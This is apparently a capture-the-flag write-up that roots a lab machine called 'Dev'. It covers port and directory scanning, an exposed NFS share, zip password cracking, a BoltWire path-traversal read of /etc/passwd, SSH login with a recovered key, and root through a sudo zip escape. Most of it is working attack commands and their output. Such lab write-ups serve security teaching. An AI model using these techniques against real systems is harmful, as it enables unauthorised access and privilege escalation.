# DEV

**IP:** 10.0.2.9

**Step 1:** Reconaissance (Information Gathering) : Skipped

**Step 2:** Scanning and Enumeration:

**Nmap**:<br>
Command used: `nmap -T4 -p- -A 10.0.2.9`

**Results:**

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-05 10:26 EST
Nmap scan report for 10.0.2.9
Host is up (0.00034s latency).
Not shown: 65526 closed tcp ports (conn-refused)
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
| 2048 bd:96:ec:08:2f:b1:ea:06:ca:fc:46:8a:7e:8a:e3:55 (RSA)
| 256 56:32:3b:9f:48:2d:e0:7e:1b:df:20:f8:03:60:56:5e (ECDSA)
|_ 256 95:dd:20:ee:6f:01:b6:e1:43:2e:3c:f4:38:03:5b:36 (ED25519)
80/tcp open http Apache httpd 2.4.38 ((Debian))
|\_http-server-header: Apache/2.4.38 (Debian)
|\_http-title: Bolt - Installation error
111/tcp open rpcbind 2-4 (RPC #100000)
| rpcinfo:
| program version port/proto service
| 100000 2,3,4 111/tcp rpcbind
| 100000 2,3,4 111/udp rpcbind
| 100000 3,4 111/tcp6 rpcbind
| 100000 3,4 111/udp6 rpcbind
| 100003 3 2049/udp nfs
| 100003 3 2049/udp6 nfs
| 100003 3,4 2049/tcp nfs
| 100003 3,4 2049/tcp6 nfs
| 100005 1,2,3 43209/tcp mountd
| 100005 1,2,3 45658/udp mountd
| 100005 1,2,3 46618/udp6 mountd
| 100005 1,2,3 52565/tcp6 mountd
| 100021 1,3,4 39131/tcp6 nlockmgr
| 100021 1,3,4 39771/tcp nlockmgr
| 100021 1,3,4 42738/udp nlockmgr
| 100021 1,3,4 52569/udp6 nlockmgr
| 100227 3 2049/tcp nfs_acl
| 100227 3 2049/tcp6 nfs_acl
| 100227 3 2049/udp nfs_acl
|_ 100227 3 2049/udp6 nfs_acl
2049/tcp open nfs_acl 3 (RPC #100227)
8080/tcp open http Apache httpd 2.4.38 ((Debian))
|\_http-server-header: Apache/2.4.38 (Debian)
| http-open-proxy: Potentially OPEN proxy.
|\_Methods supported:CONNECTION
|\_http-title: PHP 7.3.27-1~deb10u1 - phpinfo()
39771/tcp open nlockmgr 1-4 (RPC #100021)
43209/tcp open mountd 1-3 (RPC #100005)
47857/tcp open mountd 1-3 (RPC #100005)
51511/tcp open mountd 1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.09 seconds
```

**Nikto scan:**
Command used: `nikto -url 10.0.2.9`

**Results:**

```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.2.9
+ Target Hostname:    10.0.2.9
+ Target Port:        80
+ Start Time:         2022-12-05 10:23:55 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3268: /app/: Directory indexing found.
+ OSVDB-3092: /app/: This might be interesting...
+ Uncommon header 'x-debug-token' found, with contents: b1b5a7
+ OSVDB-3268: /src/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /composer.json: PHP Composer configuration file reveals configuration information - https://getcomposer.org/
+ /composer.lock: PHP Composer configuration file reveals configuration information - https://getcomposer.org/
+ /.gitignore: .gitignore file found. It is possible to grasp the directory structure.
+ 7915 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2022-12-05 10:25:17 (GMT-5) (82 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested


      *********************************************************************
      Portions of the server's headers (Apache/2.4.38) are not in
      the Nikto 2.1.6 database or are newer than the known string. Would you like
      to submit this information (*no server specific data*) to CIRT.net
      for a Nikto update (or you may email to sullo@cirt.net) (y/n)? y

+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The site uses SSL and Expect-CT header is not present.
- Sent updated info to cirt.net -- Thank you!
```

## Web Server

http://10.0.2.9

**Results:**

Shows a webpage with:

> Bolt - Installation Error

**Bolt related vulnerability found:**
[Bolt CMS 3.7.0 - Authenticated Remote Code Execution](https://www.rapid7.com/db/modules/exploit/unix/webapp/bolt_authenticated_rce/)

## Looking for port 8080 in Webserver/http:<br>

To do this put `:8080` at the end of the http link : `http://10.0.2.9:8080`

**Results:**
<br>

- We found a php info page

## FUFF scan:

Did two ffuf scan at http and port 8080

**Results:**

**At http:**

```
┌──(root㉿kali)-[/home/kali]
└─# ffuf -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt:FUZZ -u http://10.0.2.9/FUZZ

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.0.2.9/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-1.0.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 1ms]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 4ms]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 12ms]
# Unordered case sensative list, where entries were found  [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 13ms]
#                       [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 12ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 88ms]
#                       [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 135ms]
# This work is licensed under the Creative Commons  [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 140ms]
# directory-list-1.0.txt [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 145ms]
#                       [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 176ms]
# Copyright 2007 James Fisher [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 248ms]
#                       [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 258ms]
# on atleast 2 host.  This was the first draft of the list. [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 271ms]
public                  [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 1ms]
                        [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 415ms]
src                     [Status: 301, Size: 302, Words: 20, Lines: 10, Duration: 1ms]
extensions              [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 0ms]
app                     [Status: 301, Size: 302, Words: 20, Lines: 10, Duration: 0ms]
vendor                  [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 1ms]
:: Progress: [141708/141708] :: Job [1/1] :: 19814 req/sec :: Duration: [0:00:11] :: Errors: 0 ::


```

**At port 8080:**

```
┌──(root㉿kali)-[/home/kali]
└─# ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://10.0.2.9:8080/FUZZ

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.0.2.9:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 94535, Words: 4693, Lines: 1159, Duration: 21ms]
# directory-list-2.3-medium.txt [Status: 200, Size: 94534, Words: 4693, Lines: 1159, Duration: 6ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 94535, Words: 4693, Lines: 1159, Duration: 11ms]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 94535, Words: 4693, Lines: 1159, Duration: 26ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 94535, Words: 4693, Lines: 1159, Duration: 63ms]
# Copyright 2007 James Fisher [Status: 200, Size: 94535, Words: 4693, Lines: 1159, Duration: 75ms]
# This work is licensed under the Creative Commons  [Status: 200, Size: 94535, Words: 4693, Lines: 1159, Duration: 135ms]
dev                     [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 0ms]
#                       [Status: 200, Size: 94535, Words: 4693, Lines: 1159, Duration: 179ms]
                        [Status: 200, Size: 94535, Words: 4693, Lines: 1159, Duration: 196ms]
# on atleast 2 different hosts [Status: 200, Size: 94535, Words: 4693, Lines: 1159, Duration: 199ms]
# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 94535, Words: 4693, Lines: 1159, Duration: 208ms]
#                       [Status: 200, Size: 94534, Words: 4693, Lines: 1159, Duration: 332ms]
#                       [Status: 200, Size: 94535, Words: 4693, Lines: 1159, Duration: 339ms]
#                       [Status: 200, Size: 94533, Words: 4693, Lines: 1159, Duration: 370ms]
                        [Status: 200, Size: 94535, Words: 4693, Lines: 1159, Duration: 217ms]
server-status           [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 4ms]
:: Progress: [220560/220560] :: Job [1/1] :: 20629 req/sec :: Duration: [0:00:16] :: Errors: 0 ::


```

> Found some links

## Using a built-in command: showmount

> You can use showmount to display information about mounted file systems exported by Server for NFS on a specified computer. If you don't specify a server, this command displays information about the computer on which the showmount command is run.
> <br>
> Syntax:
> <br>
> showmount {-e|-a|-d} server

**Results:**

```
┌──(kali㉿kali)-[~]
└─$ showmount -e 10.0.2.9
Export list for 10.0.2.9:
/srv/nfs 172.16.0.0/12,10.0.0.0/8,192.168.0.0/16

```

> An NFS is a protocol that lets users on client computers access files on a network, making it a distributed file system.

Now we need to mout to that directory to look what it can offer.
<br>
First making a separate folder.
<br>
Then:

```
┌──(root㉿kali)-[/mnt/dev]
└─# showmount -e 10.0.2.9
Export list for 10.0.2.9:
/srv/nfs 172.16.0.0/12,10.0.0.0/8,192.168.0.0/16

┌──(root㉿kali)-[/mnt/dev]
└─# mount -t nfs 10.0.2.9:/srv/nfs /mnt/dev

┌──(root㉿kali)-[/mnt/dev]
└─# ls
save.zip

```

We got save.zip, lets unzip the file.

```
┌──(root㉿kali)-[/mnt/dev]
└─# unzip save.zip
Archive:  save.zip
[save.zip] id_rsa password:

```

Needs a password to unzip.

### Using a tool: fcrackzip to carck password of the zip file

**Installation:**

`apt-get install fcrackzip`

**Syntax:** `fcrackzip -v -u -D -p pathToTheWordlist fileToCrack`
where:

- -v for verbosity(the use of too many words)
- -u for unzipping
- -D for directory for wordlist
- -p for file

**Results:**

```
┌──(root㉿kali)-[/mnt/dev]
└─# fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip
found file 'id_rsa', (size cp/uc   1435/  1876, flags 9, chk 2a0d)
found file 'todo.txt', (size cp/uc    138/   164, flags 9, chk 2aa1)


PASSWORD FOUND!!!!: pw == java101

```

**Two files found**

- todo.txt

```
┌──(root㉿kali)-[/mnt/dev]
└─# cat todo.txt
- Figure out how to install the main website properly, the config file seems correct...
- Update development website
- Keep coding in Java because it's awesome

jp

```

- <strong>id_rsa</strong>
  > id_rsa. pub contains the public key of your RSA key pair. It may be used to allow you access the machine B over ssh without needing to enter password.

Trying to get ssh login with the username jp:

```
┌──(root㉿kali)-[/mnt/dev]
└─# ssh -i id_rsa jp@10.0.2.9
The authenticity of host '10.0.2.9 (10.0.2.9)' can't be established.
ED25519 key fingerprint is SHA256:NHMY4yX3pvvY0+B19v9tKZ+FdH9JOewJJKnKy2B0tW8.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? y
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '10.0.2.9' (ED25519) to the list of known hosts.
jp@10.0.2.9's password:

```

Asking for password. Also not sure if jp is a user.

**Moving on links found by <strong>ffuf</strong> search:**

- While looking at links, we found interesting folders in ip/app, hence skipping explaination of others.
- Looking at the `/app/cache` found config-cache.json and we found username: `bolt` and password `I_love_java`
- At `10.0.2.9:8080/app`, we found a boltwire page.

**Searching for any vulnerabilites of Boltwire:**
<br>
**Results:**

```
──(root㉿kali)-[/home/kali]
└─# searchsploit boltwire
--------------------------------------------------------------------------------------------------------------------
 Exploit Title
--------------------------------------------------------------------------------------------------------------------
BoltWire 3.4.16 - 'index.php' Multiple Cross-Site Scripting Vulnerabilities
BoltWire 6.03 - Local File Inclusion
--------------------------------------------------------------------------------------------------------------------
Shellcodes: No Results

```

- Going for local file inclusion.
- In **[exploit_db](https://www.exploit-db.com/exploits/48411)**, we found the instructions for the exploit:

```
Steps to Reproduce:

1) Using HTTP GET request browse to the following page, whilst being authenticated user.
http://192.168.51.169/boltwire/index.php?p=action.search&action=../../../../../../../etc/passwd
```

- Following the above, we first registered as user The url of login page is similar to the above syntaxt.

  > http://10.0.2.9:8080/dev/index.php?p=action.register

- Replacing after action. **\_**, got some users listed:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
jeanpaul:x:1000:1000:jeanpaul,,,:/home/jeanpaul:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false
_rpc:x:107:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:108:65534::/var/lib/nfs:/usr/sbin/nologin
```

- Among all the users we got jeanpaul which seems to be the full form of jp. So we finally got our username.

### Again trying ssh login:

```
┌──(root㉿kali)-[/mnt/dev]
└─# ssh -i id_rsa jeanpaul@10.0.2.9
Enter passphrase for key 'id_rsa':
```

- Asking for passphrase, as we found that the usr loves java through the todo.txt and similar password `I_love_java`. So, hitting blind.

```
┌──(root㉿kali)-[/mnt/dev]
└─# ssh -i id_rsa jeanpaul@10.0.2.9
Enter passphrase for key 'id_rsa':
Linux dev 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jun  2 05:25:21 2021 from 192.168.10.31
jeanpaul@dev:~$

```

- Yay! We logged in.

- Now, did some random cmds, in which a specific command `sudo -l` gave us these result:

```
jeanpaul@dev:/$ history
    1  echo "" > .bash_history
    2  sudo -l
    3  exit
    4  ls
    5  history
    6  sudo -l
    7  ls
    8  pwd
    9  cd ..
   10  pwd
   11  ls
   12  cls
   13  clear
   14  history
jeanpaul@dev:/$ sudo -l
Matching Defaults entries for jeanpaul on dev:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jeanpaul may run the following commands on dev:
    (root) NOPASSWD: /usr/bin/zip
```

- Hence we can use `sudo zip` without password.

## Time for privilage escalation:

- For this we got to [GTFOBins](https://gtfobins.github.io/) > [sudo](https://gtfobins.github.io/#+sudo) > then for [zip](https://gtfobins.github.io/gtfobins/zip/).
- We used privilage escalation with sudo module:

```
Sudo
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```

## Wallah!

```
jeanpaul@dev:/$ TF=$(mktemp -u)
jeanpaul@dev:/$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# whoami
root
# cd /rooot
sh: 2: cd: can't cd to /rooot
# exit
test of /tmp/tmp.ZoEuiexcRC FAILED

zip error: Zip file invalid, could not spawn unzip, or wrong unzip (original files unmodified)
free(): double free detected in tcache 2

jeanpaul@dev:/$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# whoami
root
# cd /root
# ls
flag.txt
# cat flag.txt
Congratz on rooting this box !
#
```

**DONE**
